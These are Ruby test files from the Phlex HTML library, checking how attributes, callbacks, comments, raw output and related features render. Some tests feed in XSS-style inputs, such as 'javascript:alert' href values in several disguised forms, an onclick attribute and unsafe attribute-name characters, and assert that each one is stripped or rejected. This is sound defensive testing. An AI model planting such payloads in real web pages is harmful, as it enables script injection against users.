--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | require "sgml_helper"
  4 |
  5 | include SGMLHelper
  6 |
  7 | test "id attributes must be lower case symbols" do
  8 | 	assert_raises(Phlex::ArgumentError) { phlex { div("id" => "abc") } }
  9 | 	assert_raises(Phlex::ArgumentError) { phlex { div("ID" => "abc") } }
 10 | 	assert_raises(Phlex::ArgumentError) { phlex { div(:ID => "abc") } }
 11 |
 12 | 	output = phlex { div(id: "abc") }
 13 | 	assert_equal_html output, %(<div id="abc"></div>)
 14 | end
 15 |
 16 | test "*invalid*, _" do
 17 | 	error = assert_raises(Phlex::ArgumentError) do
 18 | 		phlex { div(Object.new => "abc") }
 19 | 	end
 20 |
 21 | 	assert_equal error.message, "Attribute keys should be Strings or Symbols."
 22 | end
 23 |
 24 | test "unsafe event attribute" do
 25 | 	error = assert_raises(Phlex::ArgumentError) do
 26 | 		phlex { div("onclick" => true) }
 27 | 	end
 28 |
 29 | 	assert_equal error.message, "Unsafe attribute name detected: onclick."
 30 | end
 31 |
 32 | test "href with hash" do
 33 | 	error = assert_raises(Phlex::ArgumentError) do
 34 | 		phlex { a(href: {}) }
 35 | 	end
 36 |
 37 | 	assert_equal error.message, "Invalid attribute value for href: #{{}.inspect}."
 38 | end
 39 |
 40 | test "unsafe href attribute" do
 41 | 	[
 42 | 		phlex { a(href: "javascript:alert('hello')") },
 43 | 		phlex { a(href: "Javascript:alert('hello')") },
 44 | 		phlex { a("href" => "javascript:alert('hello')") },
 45 | 		phlex { a("Href" => "javascript:alert('hello')") },
 46 | 		phlex { a("Href" => "javascript:javascript:alert('hello')") },
 47 | 		phlex { a(href: " \t\njavascript:alert('hello')") },
 48 | 	].each do |output|
 49 | 		assert_equal_html output, %(<a></a>)
 50 | 	end
 51 | end
 52 |
 53 | test "unsafe attribute name <" do
 54 | 	error = assert_raises(Phlex::ArgumentError) do
 55 | 		phlex { div("<" => true) }
 56 | 	end
 57 |
 58 | 	assert_equal error.message, "Unsafe attribute name detected: <."
 59 | end
 60 |
 61 | test "unsafe attribute name >" do
 62 | 	error = assert_raises(Phlex::ArgumentError) do
 63 | 		phlex { div(">" => true) }
 64 | 	end
 65 |
 66 | 	assert_equal error.message, "Unsafe attribute name detected: >."
 67 | end
 68 |
 69 | test "unsafe attribute name &" do
 70 | 	error = assert_raises(Phlex::ArgumentError) do
 71 | 		phlex { div("&" => true) }
 72 | 	end
 73 |
 74 | 	assert_equal error.message, "Unsafe attribute name detected: &."
 75 | end
 76 |
 77 | test "unsafe attribute name '" do
 78 | 	error = assert_raises(Phlex::ArgumentError) do
 79 | 		phlex { div("'" => true) }
 80 | 	end
 81 |
 82 | 	assert_equal error.message, "Unsafe attribute name detected: '."
 83 | end
 84 |
 85 | test "unsafe attribute name \"" do
 86 | 	error = assert_raises(Phlex::ArgumentError) do
 87 | 		phlex { div('"' => true) }
 88 | 	end
 89 |
 90 | 	assert_equal error.message, "Unsafe attribute name detected: \"."
 91 | end
 92 |
 93 | test "_, nil" do
 94 | 	output = phlex { div(attribute: nil) }
 95 | 	assert_equal_html output, %(<div></div>)
 96 | end
 97 |
 98 | test "_, true" do
 99 | 	output = phlex { div(attribute: true) }
100 | 	assert_equal_html output, %(<div attribute></div>)
101 | end
102 |
103 | test "_, false" do
104 | 	output = phlex { div(attribute: false) }
105 | 	assert_equal_html output, %(<div></div>)
106 | end
107 |
108 | test "_, String" do
109 | 	with_empty_string = phlex { div(attribute: "") }
110 | 	assert_equal_html with_empty_string, %(<div attribute=""></div>)
111 |
112 | 	with_regular_string = phlex { div(attribute: "test") }
113 | 	assert_equal_html with_regular_string, %(<div attribute="test"></div>)
114 |
115 | 	with_underscores = phlex { div(attribute: "with_underscores") }
116 | 	assert_equal_html with_underscores, %(<div attribute="with_underscores"></div>)
117 |
118 | 	with_dashes = phlex { div(attribute: "with-dashes") }
119 | 	assert_equal_html with_dashes, %(<div attribute="with-dashes"></div>)
120 |
121 | 	with_spaces = phlex { div(attribute: "with spaces") }
122 | 	assert_equal_html with_spaces, %(<div attribute="with spaces"></div>)
123 |
124 | 	with_single_quotes = phlex { div(attribute: "with 'single quotes'") }
125 | 	assert_equal_html with_single_quotes, %(<div attribute="with 'single quotes'"></div>)
126 |
127 | 	with_html = phlex { div(attribute: "with <html>") }
128 | 	assert_equal_html with_html, %(<div attribute="with <html>"></div>)
129 |
130 | 	with_double_quotes = phlex { div(attribute: 'with "double quotes"') }
131 | 	assert_equal_html with_double_quotes, %(<div attribute="with &quot;double quotes&quot;"></div>)
132 | end
133 |
134 | test "_, Symbol" do
135 | 	empty_symbol = phlex { div(attribute: :"") }
136 | 	assert_equal_html empty_symbol, %(<div attribute=""></div>)
137 |
138 | 	simple_symbol = phlex { div(attribute: :test) }
139 | 	assert_equal_html simple_symbol, %(<div attribute="test"></div>)
140 |
141 | 	symbol_with_underscores = phlex { div(attribute: :with_underscores) }
142 | 	assert_equal_html symbol_with_underscores, %(<div attribute="with-underscores"></div>)
143 |
144 | 	symbol_with_dashes = phlex { div(attribute: :"with-dashes") }
145 | 	assert_equal_html symbol_with_dashes, %(<div attribute="with-dashes"></div>)
146 |
147 | 	symbol_with_spaces = phlex { div(attribute: :"with spaces") }
148 | 	assert_equal_html symbol_with_spaces, %(<div attribute="with spaces"></div>)
149 |
150 | 	symbol_with_single_quotes = phlex { div(attribute: :"with 'single quotes'") }
151 | 	assert_equal_html symbol_with_single_quotes, %(<div attribute="with 'single quotes'"></div>)
152 |
153 | 	symbol_with_html = phlex { div(attribute: :"with <html>") }
154 | 	assert_equal_html symbol_with_html, %(<div attribute="with <html>"></div>)
155 |
156 | 	symbol_with_double_quotes = phlex { div(attribute: :'with "double quotes"') }
157 | 	assert_equal_html symbol_with_double_quotes, %(<div attribute="with &quot;double quotes&quot;"></div>)
158 | end
159 |
160 | test "_, Integer" do
161 | 	output = phlex { div(attribute: 0) }
162 | 	assert_equal_html output, %(<div attribute="0"></div>)
163 |
164 | 	output = phlex { div(attribute: 42) }
165 | 	assert_equal_html output, %(<div attribute="42"></div>)
166 | end
167 |
168 | test "_, Float" do
169 | 	output = phlex { div(attribute: 0.0) }
170 | 	assert_equal_html output, %(<div attribute="0.0"></div>)
171 |
172 | 	output = phlex { div(attribute: 42.0) }
173 | 	assert_equal_html output, %(<div attribute="42.0"></div>)
174 |
175 | 	output = phlex { div(attribute: 1.234) }
176 | 	assert_equal_html output, %(<div attribute="1.234"></div>)
177 | end
178 |
179 | test "_, Date" do
180 | 	output = phlex { div(attribute: Date.new(2023, 1, 15)) }
181 | 	assert_equal_html output, %(<div attribute="2023-01-15"></div>)
182 | end
183 |
184 | test "_, Time" do
185 | 	output = phlex { div(attribute: Time.new(2023, 1, 15, 12, 30, 45)) }
186 | 	assert_equal_html output, %(<div attribute="2023-01-15T12:30:45+00:00"></div>)
187 | end
188 |
189 | test "_, *invalid*" do
190 | 	assert_raises(Phlex::ArgumentError) do
191 | 		phlex { div(attribute: Object.new) }
192 | 	end
193 | end
194 |
195 | test "_, Array" do
196 | 	output = phlex { div(attribute: []) }
197 | 	assert_equal_html output, %(<div attribute=""></div>)
198 | end
199 |
200 | test "_, Array(nil)" do
201 | 	output = phlex { div(attribute: [nil, nil, nil]) }
202 | 	assert_equal_html output, %(<div attribute=""></div>)
203 | end
204 |
205 | test "_, Array(String)" do
206 | 	output = phlex { div(attribute: ["Hello", "World"]) }
207 | 	assert_equal_html output, %(<div attribute="Hello World"></div>)
208 |
209 | 	output = phlex { div(attribute: ["with_underscores", "with-dashes", "with spaces"]) }
210 | 	assert_equal_html output, %(<div attribute="with_underscores with-dashes with spaces"></div>)
211 |
212 | 	output = phlex { div(attribute: ["with 'single quotes'", 'with "double quotes"']) }
213 | 	assert_equal_html output, %(<div attribute="with 'single quotes' with &quot;double quotes&quot;"></div>)
214 | end
215 |
216 | test "_, Array(Symbol)" do
217 | 	output = phlex { div(attribute: [:hello, :world]) }
218 | 	assert_equal_html output, %(<div attribute="hello world"></div>)
219 |
220 | 	output = phlex { div(attribute: [:with_underscores, :"with-dashes", :"with spaces"]) }
221 | 	assert_equal_html output, %(<div attribute="with-underscores with-dashes with spaces"></div>)
222 |
223 | 	output = phlex { div(attribute: [:with, :"'single quotes'", :'"double quotes"']) }
224 | 	assert_equal_html output, %(<div attribute="with 'single quotes' &quot;double quotes&quot;"></div>)
225 | end
226 |
227 | test "_, Array(Integer)" do
228 | 	output = phlex { div(attribute: [0, 42]) }
229 | 	assert_equal_html output, %(<div attribute="0 42"></div>)
230 | end
231 |
232 | test "_, Array(Float)" do
233 | 	output = phlex { div(attribute: [0.0, 42.0, 1.234]) }
234 | 	assert_equal_html output, %(<div attribute="0.0 42.0 1.234"></div>)
235 | end
236 |
237 | test "_, Array(Phlex::SGML::SafeObject)" do
238 | 	output = phlex { div(attribute: [Phlex::SGML::SafeValue.new("Hello")]) }
239 | 	assert_equal_html output, %(<div attribute="Hello"></div>)
240 | end
241 |
242 | test "_, Array(String | Array)" do
243 | 	output = phlex { div(attribute: ["hello", ["world"]]) }
244 | 	assert_equal_html output, %(<div attribute="hello world"></div>)
245 | end
246 |
247 | test "_, Array(Array | String)" do
248 | 	output = phlex { div(attribute: [["hello"], "world"]) }
249 | 	assert_equal_html output, %(<div attribute="hello world"></div>)
250 | end
251 |
252 | test "_, Array(String | EmptyArray)" do
253 | 	output = phlex { div(attribute: ["hello", []]) }
254 | 	assert_equal_html output, %(<div attribute="hello"></div>)
255 | end
256 |
257 | test "_, Array(*invalid*)" do
258 | 	assert_raises(Phlex::ArgumentError) do
259 | 		phlex { div(attribute: [Object.new]) }
260 | 	end
261 | end
262 |
263 | test "_, Hash(Symbol, _)" do
264 | 	output = phlex { div(attribute: { a_b_c: "world" }) }
265 | 	assert_equal_html output, %(<div attribute-a-b-c="world"></div>)
266 |
267 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { :'"' => "a" }) } }
268 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { :"'" => "a" }) } }
269 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { :"&" => "a" }) } }
270 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { :"<" => "a" }) } }
271 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { :">" => "a" }) } }
272 | end
273 |
274 | test "_, Hash(String, _)" do
275 | 	output = phlex { div(attribute: { "a_b_c" => "world" }) }
276 | 	assert_equal_html output, %(<div attribute-a_b_c="world"></div>)
277 |
278 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { '"' => "a" }) } }
279 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { "'" => "a" }) } }
280 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { "&" => "a" }) } }
281 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { "<" => "a" }) } }
282 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { ">" => "a" }) } }
283 | end
284 |
285 | test "_, Hash(:_, _)" do
286 | 	by_itself = phlex { div(attribute: { _: "world" }) }
287 | 	assert_equal_html by_itself, %(<div attribute="world"></div>)
288 |
289 | 	with_others = phlex { div(data: { _: "test", controller: "hello" }) }
290 | 	assert_equal_html with_others, %(<div data="test" data-controller="hello"></div>)
291 | end
292 |
293 | test "_, Hash(*invalid*, _)" do
294 | 	assert_raises(Phlex::ArgumentError) { phlex { div(attribute: { Object.new => "a" }) } }
295 | end
296 |
297 | test "_, Hash(_, String)" do
298 | 	with_underscores = phlex { div(data: { controller: "with_underscores" }) }
299 | 	assert_equal_html with_underscores, %(<div data-controller="with_underscores"></div>)
300 |
301 | 	with_dashes = phlex { div(data: { controller: "with-dashes" }) }
302 | 	assert_equal_html with_dashes, %(<div data-controller="with-dashes"></div>)
303 |
304 | 	with_spaces = phlex { div(data: { controller: "with spaces" }) }
305 | 	assert_equal_html with_spaces, %(<div data-controller="with spaces"></div>)
306 |
307 | 	with_single_quotes = phlex { div(data: { controller: "with 'single quotes'" }) }
308 | 	assert_equal_html with_single_quotes, %(<div data-controller="with 'single quotes'"></div>)
309 |
310 | 	with_html = phlex { div(data: { controller: "with <html>" }) }
311 | 	assert_equal_html with_html, %(<div data-controller="with <html>"></div>)
312 |
313 | 	with_double_quotes = phlex { div(data: { controller: 'with "double quotes"' }) }
314 | 	assert_equal_html with_double_quotes, %(<div data-controller="with &quot;double quotes&quot;"></div>)
315 | end
316 |
317 | test "_, Hash(_, Symbol)" do
318 | 	output = phlex { div(data: { controller: :with_underscores }) }
319 | 	assert_equal_html output, %(<div data-controller="with-underscores"></div>)
320 |
321 | 	output = phlex { div(data: { controller: :"with-dashes" }) }
322 | 	assert_equal_html output, %(<div data-controller="with-dashes"></div>)
323 |
324 | 	output = phlex { div(data: { controller: :"with spaces" }) }
325 | 	assert_equal_html output, %(<div data-controller="with spaces"></div>)
326 |
327 | 	output = phlex { div(data: { controller: :"with 'single quotes'" }) }
328 | 	assert_equal_html output, %(<div data-controller="with 'single quotes'"></div>)
329 |
330 | 	output = phlex { div(data: { controller: :"with <html>" }) }
331 | 	assert_equal_html output, %(<div data-controller="with <html>"></div>)
332 |
333 | 	output = phlex { div(data: { controller: :'with "double quotes"' }) }
334 | 	assert_equal_html output, %(<div data-controller="with &quot;double quotes&quot;"></div>)
335 | end
336 |
337 | test "_, Hash(_, Integer)" do
338 | 	output = phlex { div(data: { controller: 42 }) }
339 | 	assert_equal_html output, %(<div data-controller="42"></div>)
340 |
341 | 	output = phlex { div(data: { controller: 1_234 }) }
342 | 	assert_equal_html output, %(<div data-controller="1234"></div>)
343 |
344 | 	output = phlex { div(data: { controller: 0 }) }
345 | 	assert_equal_html output, %(<div data-controller="0"></div>)
346 | end
347 |
348 | test "_, Hash(_, Float)" do
349 | 	output = phlex { div(data: { controller: 42.0 }) }
350 | 	assert_equal_html output, %(<div data-controller="42.0"></div>)
351 |
352 | 	output = phlex { div(data: { controller: 1.234 }) }
353 | 	assert_equal_html output, %(<div data-controller="1.234"></div>)
354 |
355 | 	output = phlex { div(data: { controller: 0.0 }) }
356 | 	assert_equal_html output, %(<div data-controller="0.0"></div>)
357 | end
358 |
359 | test "_, Hash(_, Array)" do
360 | 	output = phlex { div(data: { controller: [1, 2, 3] }) }
361 | 	assert_equal_html output, %(<div data-controller="1 2 3"></div>)
362 | end
363 |
364 | test "_, Hash(_, Set)" do
365 | 	output = phlex { div(data: { controller: Set[1, 2, 3] }) }
366 | 	assert_equal_html output, %(<div data-controller="1 2 3"></div>)
367 | end
368 |
369 | test "_, Hash(_, Hash)" do
370 | 	output = phlex { div(data: { controller: { hello: "world" } }) }
371 | 	assert_equal_html output, %(<div data-controller-hello="world"></div>)
372 | end
373 |
374 | test "_, Hash(_, Phlex::SGML::SafeObject)" do
375 | 	output = phlex { div(data: { controller: Phlex::SGML::SafeValue.new("Hello") }) }
376 | 	assert_equal_html output, %(<div data-controller="Hello"></div>)
377 | end
378 |
379 | test "_, Hash(_, false)" do
380 | 	output = phlex { div(data: { controller: false }) }
381 | 	assert_equal_html output, %(<div></div>)
382 | end
383 |
384 | test "_, Hash(_, nil)" do
385 | 	output = phlex { div(data: { controller: nil }) }
386 | 	assert_equal_html output, %(<div></div>)
387 | end
388 |
389 | test "_, Hash(_, *invalid*)" do
390 | 	assert_raises(Phlex::ArgumentError) do
391 | 		phlex { div(data: { controller: Object.new }) }
392 | 	end
393 | end
394 |
395 | test "_, Set(nil)" do
396 | 	output = phlex { div(attribute: Set[nil, nil, nil]) }
397 | 	assert_equal_html output, %(<div attribute=""></div>)
398 | end
399 |
400 | test "_, Set(String)" do
401 | 	output = phlex { div(attribute: Set["Hello", "World"]) }
402 | 	assert_equal_html output, %(<div attribute="Hello World"></div>)
403 |
404 | 	output = phlex { div(attribute: Set["with_underscores", "with-dashes", "with spaces"]) }
405 | 	assert_equal_html output, %(<div attribute="with_underscores with-dashes with spaces"></div>)
406 |
407 | 	output = phlex { div(attribute: Set["with 'single quotes'", 'with "double quotes"']) }
408 | 	assert_equal_html output, %(<div attribute="with 'single quotes' with &quot;double quotes&quot;"></div>)
409 | end
410 |
411 | test "_, Set(Symbol)" do
412 | 	output = phlex { div(attribute: Set[:hello, :world]) }
413 | 	assert_equal_html output, %(<div attribute="hello world"></div>)
414 |
415 | 	output = phlex { div(attribute: Set[:with_underscores, :"with-dashes", :"with spaces"]) }
416 | 	assert_equal_html output, %(<div attribute="with-underscores with-dashes with spaces"></div>)
417 |
418 | 	output = phlex { div(attribute: Set[:with, :"single quotes", :'"double quotes"']) }
419 | 	assert_equal_html output, %(<div attribute="with single quotes &quot;double quotes&quot;"></div>)
420 | end
421 |
422 | test "_, Set(Integer)" do
423 | 	output = phlex { div(attribute: Set[0, 42]) }
424 | 	assert_equal_html output, %(<div attribute="0 42"></div>)
425 | end
426 |
427 | test "_, Set(Float)" do
428 | 	output = phlex { div(attribute: Set[0.0, 42.0, 1.234]) }
429 | 	assert_equal_html output, %(<div attribute="0.0 42.0 1.234"></div>)
430 | end
431 |
432 | test "_, Set(Phlex::SGML::SafeObject)" do
433 | 	output = phlex do
434 | 		div(attribute: Set[Phlex::SGML::SafeValue.new("Hello")])
435 | 	end
436 |
437 | 	assert_equal_html output, %(<div attribute="Hello"></div>)
438 | end
439 |
440 | test "_, Set(*invalid*)" do
441 | 	assert_raises(Phlex::ArgumentError) do
442 | 		phlex { div(attribute: Set[Object.new]) }
443 | 	end
444 | end
445 |
446 | test ":style, Array(nil)" do
447 | 	output = phlex { div(style: [nil, nil, nil]) }
448 | 	assert_equal_html output, %(<div style=""></div>)
449 | end
450 |
451 | test ":style, Array(Symbol)" do
452 | 	assert_raises(Phlex::ArgumentError) do
453 | 		phlex { div(style: [:color_blue]) }
454 | 	end
455 | end
456 |
457 | test ":style, Array(String)" do
458 | 	output = phlex { div(style: ["color: blue;", "font-weight: bold"]) }
459 | 	assert_equal_html output, %(<div style="color: blue; font-weight: bold;"></div>)
460 |
461 | 	output = phlex { div(style: ["font-family: 'MonoLisa'"]) }
462 | 	assert_equal_html output, %(<div style="font-family: 'MonoLisa';"></div>)
463 |
464 | 	output = phlex { div(style: ['font-family: "MonoLisa"']) }
465 | 	assert_equal_html output, %(<div style="font-family: &quot;MonoLisa&quot;;"></div>)
466 | end
467 |
468 | test ":style, Array(Phlex::SGML::SafeObject)" do
469 | 	output = phlex { div(style: [Phlex::SGML::SafeValue.new("color: blue")]) }
470 | 	assert_equal_html output, %(<div style="color: blue;"></div>)
471 |
472 | 	output = phlex { div(style: [Phlex::SGML::SafeValue.new("font-weight: bold;")]) }
473 | 	assert_equal_html output, %(<div style="font-weight: bold;"></div>)
474 | end
475 |
476 | test ":style, Array(Hash)" do
477 | 	output = phlex { div(style: [{ color: "blue" }, { font_weight: "bold", line_height: 1.5 }]) }
478 | 	assert_equal_html output, %(<div style="color: blue; font-weight: bold; line-height: 1.5;"></div>)
479 | end
480 |
481 | test ":style, Set(nil)" do
482 | 	output = phlex { div(style: Set[nil]) }
483 | 	assert_equal_html output, %(<div style=""></div>)
484 | end
485 |
486 | test ":style, Set(String)" do
487 | 	output = phlex { div(style: Set["color: blue"]) }
488 | 	assert_equal_html output, %(<div style="color: blue;"></div>)
489 | end
490 |
491 | test ":style, Hash(Symbol, String)" do
492 | 	output = phlex { div(style: { color: "blue", font_weight: "bold" }) }
493 | 	assert_equal_html output, %(<div style="color: blue; font-weight: bold;"></div>)
494 | end
495 |
496 | test ":style, Hash(Symbol, Integer)" do
497 | 	output = phlex { div(style: { line_height: 2 }) }
498 | 	assert_equal_html output, %(<div style="line-height: 2;"></div>)
499 | end
500 |
501 | test ":style, Hash(Symbol, Float)" do
502 | 	output = phlex { div(style: { line_height: 1.5 }) }
503 | 	assert_equal_html output, %(<div style="line-height: 1.5;"></div>)
504 | end
505 |
506 | test ":style, Hash(Symbol, Symbol)" do
507 | 	output = phlex { div(style: { flex_direction: :column_reverse }) }
508 | 	assert_equal_html output, %(<div style="flex-direction: column-reverse;"></div>)
509 |
510 | 	output = phlex { div(style: { flex_direction: :'"double quotes"' }) }
511 | 	assert_equal_html output, %(<div style="flex-direction: &quot;double quotes&quot;;"></div>)
512 | end
513 |
514 | test ":style, Hash(Symbol, Phlex::SGML::SafeObject)" do
515 | 	output = phlex { div(style: { color: Phlex::SGML::SafeValue.new("blue") }) }
516 | 	assert_equal_html output, %(<div style="color: blue;"></div>)
517 | end
518 |
519 | test ":style, Hash(Symbol, nil)" do
520 | 	output = phlex { div(style: { color: nil }) }
521 | 	assert_equal_html output, %(<div style=""></div>)
522 | end
523 |
524 | test ":style, Hash(Symbol, *invalid*)" do
525 | 	assert_raises(Phlex::ArgumentError) do
526 | 		phlex { div(style: { color: Object.new }) }
527 | 	end
528 | end
529 |
530 | test ":style, Hash(String, String)" do
531 | 	output = phlex { div(style: { "color" => "blue" }) }
532 | 	assert_equal_html output, %(<div style="color: blue;"></div>)
533 | end
534 |
535 | test ":style, Hash(*invalid*, String)" do
536 | 	assert_raises(Phlex::ArgumentError) do
537 | 		phlex { div(style: { Object.new => "blue" }) }
538 | 	end
539 | end
540 |
541 | test ":srcset on img with an Array" do
542 | 	output = phlex { img(srcset: []) }
543 | 	assert_equal_html output, %(<img srcset="">)
544 |
545 | 	output = phlex { img(srcset: ["image.jpg 1x", "image@2x.jpg 2x"]) }
546 | 	assert_equal_html output, %(<img srcset="image.jpg 1x, image@2x.jpg 2x">)
547 | end
548 |
549 | test ":media on link with an Array" do
550 | 	output = phlex { link(media: []) }
551 | 	assert_equal_html output, %(<link media="">)
552 |
553 | 	output = phlex { link(media: ["screen", "print"]) }
554 | 	assert_equal_html output, %(<link media="screen, print">)
555 |
556 | 	output = phlex { link(media: ["(max-width: 600px)", "(min-width: 1200px)"]) }
557 | 	assert_equal_html output, %(<link media="(max-width: 600px), (min-width: 1200px)">)
558 | end
559 |
560 | test ":sizes on link with an Array" do
561 | 	output = phlex { link(sizes: []) }
562 | 	assert_equal_html output, %(<link sizes="">)
563 |
564 | 	output = phlex { link(sizes: ["16x16", "32x32", "64x64"]) }
565 | 	assert_equal_html output, %(<link sizes="16x16, 32x32, 64x64">)
566 | end
567 |
568 | test ":imagesrcset on link with an Array when rel is preload and as is image" do
569 | 	output = phlex { link(imagesrcset: [], rel: "preload", as: "image") }
570 | 	assert_equal_html output, %(<link imagesrcset="" rel="preload" as="image">)
571 |
572 | 	output = phlex { link(imagesrcset: ["image.jpg 1x", "image@2x.jpg 2x"], rel: "preload", as: "image") }
573 | 	assert_equal_html output, %(<link imagesrcset="image.jpg 1x, image@2x.jpg 2x" rel="preload" as="image">)
574 |
575 | 	output = phlex { link(imagesrcset: ["image.jpg 1x", "image@2x.jpg 2x"], rel: :preload, as: :image) }
576 | 	assert_equal_html output, %(<link imagesrcset="image.jpg 1x, image@2x.jpg 2x" rel="preload" as="image">)
577 |
578 | 	output = phlex { link(:imagesrcset => ["image.jpg 1x", "image@2x.jpg 2x"], "rel" => "preload", "as" => "image") }
579 | 	assert_equal_html output, %(<link imagesrcset="image.jpg 1x, image@2x.jpg 2x" rel="preload" as="image">)
580 | end
581 |
582 | test ":accept on input with array when type is file" do
583 | 	output = phlex { input(accept: [], type: "file") }
584 | 	assert_equal_html output, %(<input accept="" type="file">)
585 |
586 | 	output = phlex { input(accept: ["image/jpeg", "image/png"], type: "file") }
587 | 	assert_equal_html output, %(<input accept="image/jpeg, image/png" type="file">)
588 |
589 | 	output = phlex { input(accept: ["image/jpeg", "image/png"], type: :file) }
590 | 	assert_equal_html output, %(<input accept="image/jpeg, image/png" type="file">)
591 |
592 | 	output = phlex { input(:accept => ["image/jpeg", "image/png"], "type" => "file") }
593 | 	assert_equal_html output, %(<input accept="image/jpeg, image/png" type="file">)
594 | end
595 |
596 | # This is just for coverage.
597 | Phlex::HTML.call do |c|
598 | 	c.__send__(:__styles__, nil)
599 | end
600 |


--------------------------------------------------------------------------------
/quickdraw/sgml/callbacks.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::HTML
 4 | 	def before_template
 5 | 		i { "1" }
 6 | 	end
 7 |
 8 | 	def around_template
 9 | 		i { "2" }
10 |
11 | 		super do
12 | 			i { "3" }
13 | 			yield
14 | 			i { "5" }
15 | 		end
16 |
17 | 		i { "6" }
18 | 	end
19 |
20 | 	def after_template
21 | 		i { "7" }
22 | 	end
23 |
24 | 	def view_template
25 | 		i { "4" }
26 | 	end
27 | end
28 |
29 | test "callbacks are called in the correct order" do
30 | 	assert_equal_html Example.call, "<i>1</i><i>2</i><i>3</i><i>4</i><i>5</i><i>6</i><i>7</i>"
31 | end
32 |


--------------------------------------------------------------------------------
/quickdraw/sgml/capture.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class ExampleCaptureWithArguments < Phlex::HTML
 4 | 	def view_template(&block)
 5 | 		h1 { capture("a", "b", "c", &block) }
 6 | 	end
 7 | end
 8 |
 9 | test "arguments are passed to the capture block" do
10 | 	output = ExampleCaptureWithArguments.new.call do |a, b, c|
11 | 		"#{a} #{b} #{c}"
12 | 	end
13 |
14 | 	assert_equal_html output, "<h1>a b c</h1>"
15 | end
16 |


--------------------------------------------------------------------------------
/quickdraw/sgml/comment.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 |
 5 | include SGMLHelper
 6 |
 7 | test "text comment" do
 8 | 	output = phlex do
 9 | 		comment { "Hello World" }
10 | 	end
11 |
12 | 	assert_equal_html output, "<!-- Hello World -->"
13 | end
14 |
15 | test "block comment with markup" do
16 | 	output = phlex do
17 | 		comment do
18 | 			h1 { "Hello World" }
19 | 		end
20 | 	end
21 |
22 | 	assert_equal_html output, "<!-- <h1>Hello World</h1> -->"
23 | end
24 |


--------------------------------------------------------------------------------
/quickdraw/sgml/conditional_rendering.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::HTML
 4 | 	def initialize(render:)
 5 | 		@render = render
 6 | 	end
 7 |
 8 | 	def render? = @render
 9 |
10 | 	def view_template
11 | 		h1 { "Hello" }
12 | 	end
13 | end
14 |
15 | test do
16 | 	assert_equal_html Example.new(render: true).call, "<h1>Hello</h1>"
17 | 	assert_equal_html Example.new(render: false).call, ""
18 | end
19 |
20 | class ExampleWithContext < Phlex::HTML
21 | 	def render? = context[:render]
22 |
23 | 	def view_template
24 | 		h1 { "Hello" }
25 | 	end
26 | end
27 |
28 | test do
29 | 	assert_equal_html ExampleWithContext.new.call(context: { render: true }), "<h1>Hello</h1>"
30 | 	assert_equal_html ExampleWithContext.new.call(context: { render: false }), ""
31 | end
32 |


--------------------------------------------------------------------------------
/quickdraw/sgml/content_yielding.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class TestClass < Phlex::HTML
 4 | 	def view_template
 5 | 		select(name: "test") do
 6 | 			[].each { |i| option_tag(i, i) }
 7 | 		end
 8 |
 9 | 		input(type: "text", name: "other")
10 | 	end
11 | end
12 |
13 | test "should render the test class" do
14 | 	assert_equal_html TestClass.call, %q(<select name="test"></select><input type="text" name="other">)
15 | end
16 |
17 | class OtherTestClass < Phlex::HTML
18 | 	def view_template
19 | 		ul do
20 | 			[].each { |i| li { i } }
21 | 		end
22 |
23 | 		p { "hi there" }
24 | 	end
25 | end
26 |
27 | test "should render the test class" do
28 | 	assert_equal_html OtherTestClass.call, %q(<ul></ul><p>hi there</p>)
29 | end
30 |


--------------------------------------------------------------------------------
/quickdraw/sgml/plain.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 |
 5 | include SGMLHelper
 6 |
 7 | test "with string" do
 8 | 	output = phlex { plain "Hello, World!" }
 9 | 	assert_equal_html output, "Hello, World!"
10 | end
11 |
12 | test "with symbol" do
13 | 	output = phlex { plain :hello_world }
14 | 	assert_equal_html output, "hello_world"
15 | end
16 |
17 | test "with integer" do
18 | 	output =	phlex { plain 42 }
19 | 	assert_equal_html output, "42"
20 | end
21 |
22 | test "with float" do
23 | 	output = phlex { plain 3.14 }
24 | 	assert_equal_html output, "3.14"
25 | end
26 |
27 | test "with nil" do
28 | 	output = phlex { plain nil }
29 | 	assert_equal_html output, ""
30 | end
31 |
32 | test "with invalid arguments" do
33 | 	assert_raises(Phlex::ArgumentError) do
34 | 		phlex { plain [] }
35 | 	end
36 | end
37 |


--------------------------------------------------------------------------------
/quickdraw/sgml/raw.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 |
 5 | include SGMLHelper
 6 |
 7 | test "with an unsafe object" do
 8 | 	error = assert_raises(Phlex::ArgumentError) do
 9 | 		phlex { raw "<div></div>" }
10 | 	end
11 |
12 | 	assert_equal error.message, "You passed an unsafe object to `raw`."
13 | end
14 |
15 | test "with a safe object" do
16 | 	output = phlex { raw safe %(<div class="hello">&</div>) }
17 | 	assert_equal_html output, %(<div class="hello">&</div>)
18 | end
19 |
20 | test "with nil" do
21 | 	output = phlex { div { raw nil } }
22 | 	assert_equal_html output, "<div></div>"
23 | end
24 |
25 | test "with empty string" do
26 | 	output = phlex { div { raw "" } }
27 | 	assert_equal_html output, "<div></div>"
28 | end
29 |


--------------------------------------------------------------------------------
/quickdraw/sgml/safe.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 |
 5 | include SGMLHelper
 6 |
 7 | test "safe attribute values" do
 8 | 	output = phlex do
 9 | 		a(
